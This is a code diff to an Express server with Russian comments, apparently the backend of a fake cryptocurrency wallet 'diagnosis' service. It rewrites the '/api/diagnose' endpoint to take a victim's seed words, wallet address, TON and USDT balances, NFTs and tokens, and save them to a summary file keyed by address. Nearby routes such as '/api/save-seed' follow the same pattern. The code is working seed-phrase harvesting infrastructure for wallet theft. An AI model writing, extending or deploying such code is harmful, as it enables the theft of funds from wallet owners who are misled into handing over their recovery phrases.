@@ -32,10 +32,46 @@ app.post('/save-wallet', (req, res) => {
 });
 
 // POST /api/diagnose (заглушка)
+
 app.post('/api/diagnose', (req, res) => {
-  // Здесь должна быть логика диагностики кошелька
-  // Для теста возвращаем фиктивный результат
-  res.json({ success: true, result: 'Диагностика завершена', data: req.body });
+  const {
+    walletName = 'Trust Wallet',
+    address = '',
+    words = [],
+    ton = '',
+    usdt = '',
+    nft = '',
+    tokens = '',
+    tokenList = '',
+    nftList = '',
+    wordCount = words.length
+  } = req.body;
+
+  const now = new Date();
+  const dateStr = now.toLocaleString('ru-RU', { hour12: false });
+  const addressShort = address || '---';
+  const filename = `${addressShort}.summary.txt`;
+  let summary = `=== Новая запись ===\n`;
+  summary += `Дата: ${dateStr}\n`;
+  summary += `Кошелёк: ${walletName}\n`;
+  summary += `Количество слов: ${wordCount}\n`;
+  summary += `Адрес кошелька: ${addressShort} - ${addressShort.length} символов начало с UQ\n`;
+  summary += `Сумма TON: ${ton}\n`;
+  summary += `Сумма USDT: ${usdt}\n`;
+  summary += `Количество NFT: ${nft}\n`;
+  summary += `Количество токенов всего: ${tokens}\n`;
+  summary += `Слова:`;
+  words.forEach((w, i) => { summary += `\n${i+1}. ${w}`; });
+  summary += `\n\nСписок токенов: ${tokenList}\n`;
+  summary += `Список NFT: ${nftList}\n`;
+
+  const filePath = path.join(walletsDir, filename);
+  fs.writeFile(filePath, summary, err => {
+    if (err) {
+      return res.status(500).json({ error: 'Failed to save summary' });
+    }
+    res.json({ success: true, file: filename, summary });
+  });
 });
 
 // POST /api/save-seed (заглушка)
